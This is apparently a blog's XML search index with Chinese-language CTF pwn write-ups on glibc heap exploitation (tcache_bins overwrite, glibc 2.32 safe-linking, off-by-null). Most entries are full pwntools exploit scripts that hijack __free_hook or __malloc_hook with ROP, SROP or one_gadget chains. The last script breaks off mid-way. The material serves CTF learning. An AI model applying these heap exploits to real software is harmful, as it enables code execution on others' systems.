<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>TCACHE_MAX_BINS_attack</title>
      <link href="/2021/04/16/TCACHE-MAX-BINS-attack/"/>
      <url>/2021/04/16/TCACHE-MAX-BINS-attack/</url>
      
        <content type="html"><![CDATA[<p>一种利用修改tcache最大size限制来攻击的方式 类似global_max_fast<br>tcache的size范围是0x20到0x410,通过修改<code>mp_.tcache_bins</code>可以达成超过该范围的idx仍视作tcache取出的效果.</p><a id="more"></a><h1 id="VNCTF-LittleRedFlower"><a href="#VNCTF-LittleRedFlower" class="headerlink" title="VNCTF-LittleRedFlower"></a>VNCTF-LittleRedFlower</h1><p>题目首先给了libc地址,然后给了任意地址修改一字节<br>然后给了堆地址上的任意地址写八字节<br>最后给了一个size 0x1000以上的malloc</p><p>根据流程,先修改tcache_bins的高字节,这样堆上远大于原tcache struct的部分全都被视作对于的tcache count和entries<br>题目malloc了一个全为0x1的chunk 将这个始做count,计算偏移,利用写八字节的机会在对应的entries写free_hook地址,将其对应size malloc出来写orw即可</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *context.log_level = &quot;debug&quot;context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]context.arch = &#39;amd64&#39;sh = process(&#39;./redflower&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)sh.recvuntil(&quot;GIFT: &quot;)libc_base = int(sh.recvline(),16) - libc.symbols[&#39;_IO_2_1_stdout_&#39;]libc.address = libc_basetcache_bins = libc_base + 0x1Eb2D0# tcache_ptr_addr = 0x603090 + 8 * ((x - 0x603010) / 2)# count对应的entries偏移地址log.success(&#39;libc_base = &#39; + hex(libc_base))sh.recvuntil(&#39;anywhere&#39;)sh.send(p64(tcache_bins + 7))sh.recvuntil(&quot;what?&quot;)sh.send(&#39;\xff&#39;)sh.recvuntil(&quot;Offset:&quot;)sh.sendline(str(0x830))sh.recvuntil(&#39;Content:&#39;)sh.send(p64(libc.symbols[&#39;__free_hook&#39;]))# size = ((x - 0x603010) / 2) * 0x10 + 0x20 - 0x10# 需要malloc的chunksizesh.recvuntil(&#39;size:&#39;)sh.sendline(str(0x14a0-0x10))rdx_gadget = libc_base + 0x0000000000154930#0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; rdi_ret = libc_base + 0x0000000000026b72ret = libc_base + 0x0000000000025679rsi_ret = libc_base + 0x0000000000027529rdx_r12_ret = libc_base + 0x000000000011c371rax_ret = libc_base + 0x000000000004a550syscall = libc_base + 0x0000000000066229free_hook = libc.symbols[&#39;__free_hook&#39;]setcontext = libc.symbols[&#39;setcontext&#39;] + 61rop_addr = free_hook + 0x200frame_addr = free_hook + 0x10rop = p64(rdi_ret) + p64(frame_addr + 0x1e0) + p64(rsi_ret) + p64(0) + p64(rax_ret) + p64(constants.SYS_open) + p64(syscall)rop += p64(rdi_ret) + p64(3) + p64(rsi_ret) + p64(free_hook + 0x400) + p64(rdx_r12_ret) + p64(0x30) + p64(0) + p64(libc.symbols[&#39;read&#39;])rop += p64(rdi_ret) + p64(1) + p64(rsi_ret) + p64(free_hook + 0x400) + p64(rdx_r12_ret) + p64(0x30) + p64(0) + p64(libc.symbols[&#39;write&#39;])frame = SigreturnFrame()frame.rsp = rop_addrframe.rip = retpayload = p64(rdx_gadget) + p64(free_hook + 0x10) + p64(0) * 4 + p64(setcontext) + bytes(frame)[0x28:] payload = payload.ljust(0x1f0,b&#39;\x00&#39;)payload += b&#39;./flag\x00\x00&#39; + p64(0)payload += ropgdb.attach(sh)sh.send(payload)sh.interactive()</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://blog.wjhwjhn.com/archives/192/" target="_blank" rel="noopener">glibc 2.27-2.32 版本下 Tcache Struct 的溢出利用</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc-2.32</title>
      <link href="/2021/04/16/glibc-2-32/"/>
      <url>/2021/04/16/glibc-2-32/</url>
      
        <content type="html"><![CDATA[<p>2.32tcache和fastbin在放入时会加入一个异或加密.</p><a id="more"></a><h1 id="vnctf-ff"><a href="#vnctf-ff" class="headerlink" title="vnctf-ff"></a>vnctf-ff</h1><p>2.32主要在于第一个放进tcache的块可以泄露堆基址,从而可以选择打tcache struct来任意地址malloc</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *context.log_level = &quot;debug&quot;context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]sh = process(&#39;./ff&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def add(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Size:\n&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Content:\n&#39;)    sh.sendline(content)    sh.recvuntil(&#39;&gt;&gt;&#39;)def add_n(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Size:\n&#39;,timeout=0.5)    sh.sendline(str(size))    sh.recvuntil(&#39;Content:\n&#39;,timeout=0.5)    sh.send(content)    sh.recvuntil(&#39;&gt;&gt;&#39;)def delete():    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;&gt;&gt;&#39;,timeout=0.5)def show():    sh.sendline(&#39;3&#39;)    data = sh.recvuntil(&#39;1.add&#39;,drop=True)    sh.recvuntil(&#39;&gt;&gt;&#39;)    return datadef edit(content):    sh.sendline(&quot;5&quot;)    sh.recvuntil(&#39;Content:\n&#39;)    sh.sendline(content)    sh.recvuntil(&#39;&gt;&gt;&#39;)add(0x78,&#39;a&#39;)delete()key = u64(show().ljust(8,b&#39;\x00&#39;))log.info(&quot;key = &quot;)log.info(hex(key))heap_base = key &lt;&lt; 12log.success(hex(heap_base))edit(p64(0) * 2)delete()edit(p64(key ^ (heap_base + 0x10)) + p64(0))add(0x78,&#39;a&#39;)payload = p64(0) * 9 + p64(0x0007000000000000) + p64(0) * 5add(0x78,payload)delete()payload = p64(0x0000000100010001) + p64(0x0000000000010001)add(0x48,payload)add(0x48,p64(0) * 6 + p64(heap_base + 0xb0) + p64(0) + p64(heap_base + 0x90))sh.sendline(&#39;1&#39;)sh.recvuntil(&#39;Size:\n&#39;)sh.sendline(str(0x18))sh.recvuntil(&#39;Content:\n&#39;)sh.send(&#39;\xc0\xa6&#39;)sh.recvuntil(&#39;&gt;&gt;&#39;)payload = p64(0xfbad1800) + p64(0) * 3 + b&#39;\x00&#39; # add_n(0x58,payload)sh.sendline(&#39;1&#39;)sh.recvuntil(&#39;Size:\n&#39;)sh.sendline(str(0x58))sh.recvuntil(&#39;Content:\n&#39;)sh.send(payload)libc_base = u64(sh.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x1E4744log.success(&#39;libc_base = &#39; + hex(libc_base)) free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]system = libc_base + libc.symbols[&#39;system&#39;]sh.recvuntil(&#39;&gt;&gt;&#39;)payload = p64(0) + p64(heap_base + 0x60) + p64(0) * 2 + p64(free_hook)*2add_n(0x38,payload)add_n(0x68,p64(system))add_n(0x28,&#39;/bin/sh\x00&#39;)# gdb.attach(sh)delete()sh.interactive()</code></pre><h1 id="DASCTF2021-MAR-clown"><a href="#DASCTF2021-MAR-clown" class="headerlink" title="DASCTF2021 MAR clown"></a>DASCTF2021 MAR clown</h1><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *context.log_level = &quot;debug&quot;context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]context.arch = &#39;amd64&#39;sh = process(&#39;./clown&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def add(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Size: \n&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Content: \n&#39;)    sh.sendline(content)    sh.recvuntil(&#39;&gt;&gt;&#39;)def add_n(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Size: \n&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Content: \n&#39;)    sh.send(content)    sh.recvuntil(&#39;&gt;&gt;&#39;)def delete(idx):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&quot;Index: \n&quot;)    sh.sendline(str(idx))    sh.recvuntil(&#39;&gt;&gt;&#39;,timeout=0.5)def show(idx):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&quot;Index: \n&quot;)    sh.sendline(str(idx))    # data = sh.recv(6)    data = sh.recvuntil(&#39;\nDone&#39;,drop=True)    sh.recvuntil(&#39;&gt;&gt;&#39;,timeout=0.5)    return dataadd(0x40,&#39;a&#39;) #0for i in range(9):    add(0x90,&#39;a&#39;) #1-9# for i in range(8):#     delete(i)delete(0)for i in range(8):    delete(i+1)key = u64(show(0).ljust(8,b&#39;\x00&#39;)) heap_base = key &lt;&lt; 12log.info(&quot;heap_base = &quot; + hex(heap_base))add(0x78,&#39;&#39;) #10libc_base = u64(show(8).ljust(8,b&#39;\x00&#39;)) - 0x1E3C0alog.success(&quot;libc_base = &quot; + hex(libc_base))libc.address = libc_basefor i in range(10):    add(0x40,&#39;a&#39;) #11 - 20for i in range(7):    delete(i + 11)delete(18) #21delete(19) #22delete(18) #23for i in range(7):    add(0x40,&#39;a&#39;) # 30add(0x40,p64((heap_base + 0xf0 ) ^ key)) #add(0x40,&#39;a&#39;) #add(0xe0,&#39;a&#39;) #31add(0xf0,&#39;a&#39;) #32add(0xc0,&#39;a&#39;) #33delete(31)delete(30)add(0x40,&#39;a&#39;) #33free_hook = libc.sym[&#39;__free_hook&#39;]add_n(0x40,p64(0) + p64(free_hook + 0xf0) + p64(free_hook))rdx_gadget = libc_base + 0x000000000014b760setcontext = libc.symbols[&#39;setcontext&#39;] + 61frame_addr = free_hook + 0x10 # rdx = [rdi +8]ret = libc_base + 0x0000000000026699frame = SigreturnFrame()frame.rax = 0frame.rsp = frame_addr + 0x118 #rop_addrframe.rip = ret #flag_addr = frame_addr + 0x100rdi_ret = libc_base + 0x000000000002858frsi_ret = libc_base + 0x000000000002ac3frdx_r12_ret = libc_base + 0x0000000000114161rop = p64(rdi_ret) + p64(flag_addr) + p64(rsi_ret) + p64(0) + p64(libc.symbols[&#39;open&#39;]) rop += p64(rdi_ret) + p64(3) + p64(rsi_ret) + p64(frame_addr + 0x200) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc.symbols[&#39;read&#39;])rop += p64(rdi_ret) + p64(1) + p64(rsi_ret) + p64(frame_addr + 0x200) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc.symbols[&#39;write&#39;])#0x000000000014b760: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; payload = p64(rdx_gadget) + p64(free_hook + 0x10) + p64(0)*4 + p64(setcontext) + (bytes(frame)[0x28:])+ b&#39;./flag&#39;.ljust(0x10,b&#39;\x00&#39;) + p64(0) + rop# free_hook -&gt; rdx_gadget  free -&gt; rdi = &amp;free_hook ; rdi+8 = &amp; p64(free_hook + 0x10)  ; rdx + 0x20 = setcontext + 61 , frame = rdx = free_hook + 0x10# setcontext -&gt; rsp = rop addr ; rip = ret ;log.info(hex(len(payload)))add(0xf0,payload[:0xe8]) #35add(0xe0,payload[0xe8:]) #36# gdb.attach(sh)sh.sendline(&#39;2&#39;)sh.recvuntil(&#39;Index: &#39;)sh.sendline(&#39;35&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>off_by_null</title>
      <link href="/2021/04/13/off-by-null/"/>
      <url>/2021/04/13/off-by-null/</url>
      
        <content type="html"><![CDATA[<p>offbynull总结</p><a id="more"></a><h1 id="星盟靶场-fog"><a href="#星盟靶场-fog" class="headerlink" title="星盟靶场 fog"></a>星盟靶场 fog</h1><p>在malloc的读content中有offbynull</p><pre><code class="c">__int64 __fastcall read_n(void *a1, int a2){  __int64 result; // rax  LODWORD(result) = read(0, a1, a2);  *((_BYTE *)a1 + (int)result) = 0;  return (unsigned int)result;}</code></pre><p>malloc的size限制 &lt; 0x68<br>关键点在于没有setvbuf,因此printf和fopen会申请malloc缓冲区</p><pre><code class="c">unsigned __int64 show(){  int v1; // [rsp+Ch] [rbp-4h]  syswrite(&quot;Which one do you want to see?&quot;);  v1 = readi();  if ( v1 &lt; 0 || v1 &gt; 15 || !*(_QWORD *)(16LL * v1 + mmap_addr) )    return syswrite(&quot;Error: Invalid index!\n&quot;);  printf(&quot;Index : %d\nContent : %s\n&quot;, (unsigned int)v1, *(const char **)(16LL * v1 + mmap_addr)); //printf申请0x400  return syswrite(&quot;Success!\n&quot;);}</code></pre><pre><code class="c">_BYTE *readflag(){  int v0; // eax  _BYTE *result; // rax  char v2; // [rsp+Bh] [rbp-5h]  int v3; // [rsp+Ch] [rbp-4h]  v3 = 0;  if ( stream )  {    syswrite(&quot;The flag has been opened!&quot;);    exit(-1);  }  syswrite(&quot;It&#39;s a secret!\n&quot;);  stream = fopen(&quot;./flag&quot;, &quot;rb&quot;); //fopen申请0x230  if ( !stream )  {    syswrite(&quot;A error has occurred when reading flag!&quot;);    exit(-1);  }  setbuf(stream, 0LL);  while ( 1 )  {    v2 = fgetc(stream);    if ( v2 == -1 )      break;    v0 = v3++;    *((_BYTE *)ptr + v0) ^= v2;  }  result = (char *)ptr + v3;  *result = 0;  return result;}</code></pre><p>printf申请的chunk size为0x400,可以触发malloc_consolidate<br>fopen申请的size为0x230,不能触发,但是可以通过另一种通过和topchunk合并的方式触发consolidate<br>因此一共可以触发两次合并<br>第一次一次用来构造进入unsortedbin的较大chunk用于被offbynull改小size<br>第二次用来触发伪造size的向前合并造成堆重叠</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>来自影二师傅</p><pre><code class="python">from pwn import*r=process(&#39;./fog&#39;)context.log_level=&#39;debug&#39;# libc=ELF(&#39;./libc-2.23.so&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def new(size,content):    r.recvuntil(&#39;?\n&#39;)    r.sendline(&#39;1&#39;)    r.recvline()    r.sendline(str(size))    r.recvline()    r.send(content)def delete(idx):    r.recvuntil(&#39;?\n&#39;)    r.sendline(&#39;2&#39;)    r.recvline()    r.sendline(str(idx))def edit(idx,content):    r.recvuntil(&#39;?\n&#39;)    r.sendline(&#39;3&#39;)    r.recvline()    r.sendline(str(idx))    r.recvline()    r.send(content)def show(idx):    r.recvuntil(&#39;?\n&#39;)    r.sendline(&#39;4&#39;)    r.recvline()    r.sendline(str(idx))def read_flag():    r.recvuntil(&#39;?\n&#39;)    r.sendline(&#39;5&#39;)def show_flag():    r.recvuntil(&#39;?\n&#39;)    r.sendline(&#39;6&#39;)for i in range(5): new(0x68,&#39;\n&#39;)for i in range(4): delete(i)show(4) #printf(%s) -&gt; consolidatenew(0x68,&#39;a&#39;*0x68) #0  #off by null  chunk2 size 150-&gt;100 ; chunk2 ptr + 0x150 ( ptr5 )-&gt; prev size = 0x150; prev_inuse = 0; new(0x68,&#39;\n&#39;) #1 0x71new(0x68,&#39;\n&#39;) #2delete(4)delete(1)gdb.attach(r,&#39;b * $rebase(0x1334)&#39;)read_flag() #malloc 0x230 &lt;- fopenshow_flag() #free 0x230 -&gt; top chunk -&gt; consolidatenew(0x68,&#39;\n&#39;)show(2)libc_base=u64(r.recvuntil(&#39;\x7f&#39;)[-6:]+p16(0))-libc.sym[&#39;__malloc_hook&#39;]-0x68success(&#39;libc_base: &#39;+hex(libc_base))malloc_hook=libc_base+libc.sym[&#39;__malloc_hook&#39;]realloc=libc_base+libc.sym[&#39;realloc&#39;]one_gadget=libc_base+0x4527anew(0x68,&#39;\n&#39;)delete(2)edit(3,p64(malloc_hook-0x23))new(0x68,&#39;\n&#39;)new(0x68,&#39;a&#39;*0xb+p64(one_gadget)+p64(one_gadget))# gdb.attach(r)r.recvuntil(&#39;?\n&#39;)r.sendline(&#39;1&#39;)r.interactive()</code></pre><h1 id="adworld-easyheap"><a href="#adworld-easyheap" class="headerlink" title="adworld-easyheap"></a>adworld-easyheap</h1><p>在add中有offbynull,对malloc的size没有限制,主要研究了一下free的顺序问题,具体见注释</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8from pwn import *context.log_level = &#39;DEBUG&#39;context.timeout = 1# sh = process(&#39;./timu&#39;) #local libc-2.23ubuntu11.2sh =remote(&#39;111.200.241.244&#39;,56379) #remote : libc-2.23ubuntu11.0libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def add(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Size: \n&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Data: \n&#39;)    sh.sendline(content)    sh.recvuntil(&#39;Your choice :\n&#39;)def delete(index):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;Index: \n&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Your choice :\n&#39;)def show():    sh.sendline(&#39;3&#39;)    # sh.recvuntil(&#39;Your choice :\n&#39;)# add(0x68,&#39;a&#39;) #0add(0x1b0,&#39;a&#39;) #0add(0x68,&#39;a&#39;) #1add(0x20,&#39;a&#39;) #2delete(0)add(0x68,&#39;a&#39; * 0x68) #0add(0x68,&#39;a&#39;) #3add(0x68,&#39;a&#39;) #4delete(1)delete(3) # # fastbin顺序 下面的先进 上面的后进# 然后consolidate的时候按照fastbin出栈顺序# 上方的0x71先进unsortedbin 将物理相邻的下一块chunkprevsize修改;且prev_inuse 不出发向前合并 ;相邻的下一块chunk未free 所以也不向后合并# 然后下方的伪造0x150 prev_size的chunk进unsortedbin,prev_inuse = 0 触发合并; 且可以过unlink的check成功堆重叠# 2.23unlink中的检测#if (__builtin_expect (chunksize(P) != (next_chunk(P))-&gt;prev_size, 0))      \#      malloc_printerr (check_action, &quot;corrupted size vs. prev_size&quot;, P, AV);  \# 这个unlink的检测和在2.29中的情况不一样# 2.29中检测是下方伪造过的prevsize和unlink的chunksize进行比较# if (!prev_inuse(p)) {#     prevsize = prev_size (p);#     size += prevsize;#     p = chunk_at_offset(p, -((long) prevsize));#     if (__glibc_unlikely (chunksize(p) != prevsize))#         malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);#     unlink_chunk (av, p);# }add(0x400,&#39;a&#39;) #1 consolidateadd(0x68,&#39;a&#39;) #3show()sh.recvuntil(&quot;4 : &quot;)libc_base = u64(sh.recv(6).ljust(8,&#39;\x00&#39;)) - 0x3C4B78 log.success(&#39;libc_base = &#39; + hex(libc_base))libc.address = libc_basemalloc_hook = libc.symbols[&#39;__malloc_hook&#39;]# realloc = libc.symbols[&quot;realloc&quot;]realloc = libc_base + 0x00000000000846c0fake_fast = malloc_hook - 0x23one_gadget = libc_base + 0x4526a# one_gadget = libc_base + 0x4527aadd(0x68,&#39;a&#39;) #5delete(4)delete(0)delete(5)add(0x68,p64(fake_fast))add(0x68,&#39;a&#39;)add(0x68,&#39;a&#39;)add(0x68,&#39;a&#39;*0xb  + p64(one_gadget) + p64(realloc + 2))# add(0x68,&#39;a&#39; *0x13 + p64(one_gadget))# gdb.attach(sh,&quot;b * $rebase(0xCAE)&quot;)sh.interactive()</code></pre><h1 id="GKCTF2020-domo"><a href="#GKCTF2020-domo" class="headerlink" title="GKCTF2020 domo"></a>GKCTF2020 domo</h1><pre><code class="c">unsigned __int64 __fastcall sub_E6C(const char *a1){  size_t nbytes; // [rsp+0h] [rbp-10h] BYREF  unsigned __int64 v3; // [rsp+8h] [rbp-8h]  v3 = __readfsqword(0x28u);  if ( (unsigned int)((__int64 (__fastcall *)(const char *))check_hook)(a1) == 1 &amp;&amp; chunk_num[0] &lt;= 8 )  {    HIDWORD(nbytes) = 0;    while ( SHIDWORD(nbytes) &lt;= 8 )    {      if ( !*((_QWORD *)&amp;ptr_list + SHIDWORD(nbytes)) )      {        puts(&quot;size:&quot;);        _isoc99_scanf(&quot;%d&quot;, &amp;nbytes);        if ( (nbytes &amp; 0x80000000) == 0LL &amp;&amp; (int)nbytes &lt;= 0x120 )        {          *((_QWORD *)&amp;ptr_list + SHIDWORD(nbytes)) = malloc((int)nbytes);          puts(&quot;content:&quot;);          read(0, *((void **)&amp;ptr_list + SHIDWORD(nbytes)), (unsigned int)nbytes);          *(_BYTE *)(*((_QWORD *)&amp;ptr_list + SHIDWORD(nbytes)) + (int)nbytes) = 0; //必定触发offbynull          ++chunk_num[0];        }        else        {          puts(&quot;sobig&quot;);        }        return __readfsqword(0x28u) ^ v3;      }      ++HIDWORD(nbytes);    }  }  return __readfsqword(0x28u) ^ v3;}</code></pre><p>add中有offbynull,禁用了mallochook和freehook;<br>2.23的stdout可以直接修改vtable指针为想要的地址,直接伪造vtable即可.</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *sh = process(&#39;./domo&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)context.log_level = &#39;DEBUG&#39;context.timeout = 0.5def add(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&quot;size:\n&quot;)    sh.sendline(str(size))    sh.recvuntil(&quot;content:&quot;)    sh.sendline(content)    sh.recvuntil(&#39;&gt; &#39;,timeout=0.5)def add_n(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&quot;size:\n&quot;)    sh.sendline(str(size))    sh.recvuntil(&quot;content:&quot;)    sh.send(content)    sh.recvuntil(&#39;&gt; &#39;)def delete(index):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&quot;index:\n&quot;)    sh.sendline(str(index))    sh.recvuntil(&#39;&gt; &#39;)def show(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;index:\n&#39;)    sh.sendline(str(index))    data = sh.recvuntil(&#39;\n1: A&#39;,drop=True)    sh.recvuntil(&#39;&gt; &#39;)    return datadef edit(addr,content):    sh.sendline(&#39;4&#39;)    sh.recvuntil(&quot;addr:\n&quot;)    sh.sendline(str(addr))    sh.recvuntil(&#39;num:\n&#39;)    sh.send(content)    sh.recvuntil(&#39;&gt; &#39;)add(0x20,&#39;a&#39;)add(0x20,&#39;a&#39;)add(0x20,&#39;a&#39;)delete(0)delete(1)add(0x20,&#39;&#39;)heap_base = u64(show(0).ljust(8,&#39;\x00&#39;)) - 0x0alog.info(&quot;heap_base = &quot; + hex(heap_base))delete(0)delete(2)add(0x100,&#39;a&#39;) #0add(0x60,&#39;a&#39;) #1delete(0)add(0x100,&#39;&#39;) #0libc_base = u64(show(0).ljust(8,&#39;\x00&#39;)) - 0x3C4B0Aone_gadget = libc_base + 0x4527alibc.address = libc_baselog.success(&quot;libc_base = &quot; + hex(libc_base))###add(0x100,&#39;1&#39;) #2add(0x68,&#39;2&#39;) #3add(0xF8,&#39;3&#39;) #4add(0x20,&#39;gap&#39;) #5###add(0x110,p64(0)*2 + p64(one_gadget) * 16)delete(2)delete(3)add(0x68,&#39;a&#39;*0x60 + p64(0x70+0x110)) #2 #fake_prev_size ; off by null 0x101 -&gt; 0x100delete(4)add(0x100,&#39;a&#39;) #3add(0x68,&#39;&#39;) #4delete(2)delete(1)delete(4)stdout = libc.symbols[&#39;_IO_2_1_stdout_&#39;]fake_vtable = heap_base + 0x4b0edit(stdout+ 0xd0,&#39;\x71&#39;)add(0x60,p64(stdout + 0xc8))add(0x60,&#39;a&#39;)add(0x60,&#39;a&#39;)add(0x60,p64(fake_vtable))# gdb.attach(sh,&#39;b * $rebase(0x12a9)&#39;)sh.interactive()</code></pre><h1 id="hitcon2018-children-tcache"><a href="#hitcon2018-children-tcache" class="headerlink" title="hitcon2018-children_tcache"></a>hitcon2018-children_tcache</h1><p><code>strcpy</code>函数会在字符串后加一字节<code>\x00</code>存在offbynull</p><h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8from pwn import * sh = process(&#39;./children_tcache&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)context.log_level = &quot;DEBUG&quot;context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]context.arch = &#39;amd64&#39;def add(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Data:&#39;)    sh.send(content)    sh.recvuntil(&#39;choice: &#39;)def delete(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;Index:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;choice: &#39;,timeout=0.5)def show(index):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;Index:&#39;)    sh.sendline(str(index))    data = sh.recvuntil(&#39;\n$$$&#39;,drop=True)    sh.recvuntil(&#39;choice: &#39;)    return dataadd(0x480,&#39;1&#39;)add(0x78,&#39;2&#39;)add(0x4f8,&#39;3&#39;)add(0x20,&#39;/bin/sh\x00&#39;)delete(0)delete(1)for i in range(9):    add(0x78 - i, &#39;A&#39; * (0x78 - i))    delete(0)add(0x78,b&#39;B&#39; * 0x70 + p64(0x480 + 0x10 + 0x70 + 0x10)) #strcpy 到\x00截断delete(2)add(0x480,&#39;1&#39;)libc_base = u64(show(0).ljust(8,b&#39;\x00&#39;)) - 0x3EBCA0libc.address = libc_basefree_hook = libc.symbols[&#39;__free_hook&#39;]log.success(&#39;libc_base = &#39; + hex(libc_base))add(0x78,&#39;2&#39;)delete(0)delete(2)add(0x78,p64(free_hook))add(0x78,&#39;a&#39;)add(0x78,p64(libc_base + 0x4f322))delete(3)# gdb.attach(sh,&#39;b * $rebase(0x1053)&#39;)sh.interactive()</code></pre><h1 id="balsnctf-2019-plainnote"><a href="#balsnctf-2019-plainnote" class="headerlink" title="balsnctf-2019 plainnote"></a>balsnctf-2019 plainnote</h1><p>2.29的offbynull,加了新的检测 伪造要求更高 理论成功率1/16<br>需求最后两字节为0x0000<br>值得注意的是 这题我是在2.31下做的,2.31相比于2.29,tcache增加了对tcache count是否&gt;0的检测<br>即如果tcache count = 0;但是指针有内容(比如指向free_hook) 那么2.29能直接malloc出来 2.31不能.<br>新增检测</p><pre><code>    * malloc/malloc.c (tcache_get): Compare tcache-&gt;counts[tc_idx]    with 0, not tcache-&gt;entries[tc_idx].    * nscd/connections.c (reqinfo): Initialize SHUTDOWN element only    once.</code></pre><pre><code class="c">  if (tc_idx &lt; mp_.tcache_bins      &amp;&amp; tcache      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; 0)    {      return tcache_get (tc_idx);    }</code></pre><p>2.27的代码中</p><pre><code class="c">  if (tc_idx &lt; mp_.tcache_bins      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */      &amp;&amp; tcache      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)    {      return tcache_get (tc_idx);    }</code></pre><h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8from pwn import * sh = process(&#39;./note&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)context.log_level = &quot;DEBUG&quot;context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]context.arch = &#39;amd64&#39;def add(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Size: &#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Content: &#39;)    sh.send(content)    sh.recvuntil(&#39;Choice: &#39;)def delete(index):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;Idx: &#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Choice: &#39;)def show(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;Idx: &#39;)    sh.sendline(str(index))    data = sh.recvuntil(&#39;\n***&#39;,drop=True)    sh.recvuntil(&#39;Choice: &#39;)    return data# Clean Bins 0-63for i in range(7 + 11):    add(0x18 , &#39;/bin/sh\x00&#39;)for i in range(7 + 3):    add(0x38 , &#39;Clean&#39; + &#39;n&#39;)for i in range(7 + 9):    add(0x68 , &#39;Clean&#39; + &#39;n&#39;)for i in range(7 + 2):    add(0x78 , &#39;Clean&#39; + &#39;n&#39;)for i in range(5):    add(0xC8 , &#39;Clean&#39; + &#39;n&#39;)for i in range(6):    add(0xE8 , &#39;Clean&#39; + &#39;n&#39;)for i in range(7):    add(0x28,&#39;chunk_&#39; + str(64+i) + &#39;n&#39;)  #64-70# add(0x18,&#39;gap&#39;) #71add(0x6560,&#39;gap&#39;) #71add(0x5e0,&#39;72&#39;) #72 完整的被切割chunk 0x18 + 0x28 * 4 + 0x500add(0x18,&#39;./flag\x00&#39;) #73delete(72)add(0x618,&#39;72&#39;) #72 consolidate 0x5f0 into largebin;# fd_nextsize和bk_nextsize都指向自己 即0x555555760000 也是后面chunk0的地址add(0x28,b&#39;a&#39; * 8 + p64(0xe1) + p8(0x90)) #74 #chunk0 (offset+0x10)为被合并时根据prev_size寻址的fake_chunk e1为fake_size # 修改fake_chunk fd为0x90 (原chunk0的fd_nextsize有堆地址) bk不变 0x555555760000add(0x28,&#39;75&#39;) #1 75add(0x28,&#39;76&#39;) #2 